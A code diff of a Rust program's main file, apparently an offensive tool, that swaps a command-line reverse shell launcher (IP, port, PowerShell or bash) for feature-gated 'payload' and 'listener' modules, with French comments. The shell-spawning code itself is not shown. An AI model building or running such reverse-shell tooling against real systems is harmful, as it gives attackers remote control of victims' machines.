@@ -1,23 +1,21 @@
-mod reverse_shell;
 
-use std::env;
+#[cfg(feature = "payload")]
+mod payload;  // Inclure le module reverse_shell si la feature "reverse_shell" est activée
+
+#[cfg(feature = "listener")]
+mod listener;  // Inclure le module listener si la feature "listener" est activée
 
 fn main() {
-    let args: Vec<String> = env::args().collect();
-
-    if args.len() != 4 {
-        eprintln!("Usage: {} <ip> <port> <type>", args[0]);
-        eprintln!("Type: powershell | bash");
-        return;
+    // Logique conditionnelle
+    #[cfg(feature = "payload")]
+    {
+        println!("Exécution du reverse shell...");
+        payload::run_reverse_shell();
     }
 
-    let ip = &args[1];
-    let port = &args[2];
-    let reverse_type = &args[3];
-
-    match reverse_type.as_str() {
-        "powershell" => reverse_shell::run_powershell_shell(ip, port),
-        "bash" => reverse_shell::run_bash_shell(ip, port),
-        _ => eprintln!("Invalid type. Use 'powershell', or 'bash'."),
+    #[cfg(feature = "listener")]
+    {
+        println!("Lancement du listener...");
+        listener::start_listener();
     }
 }
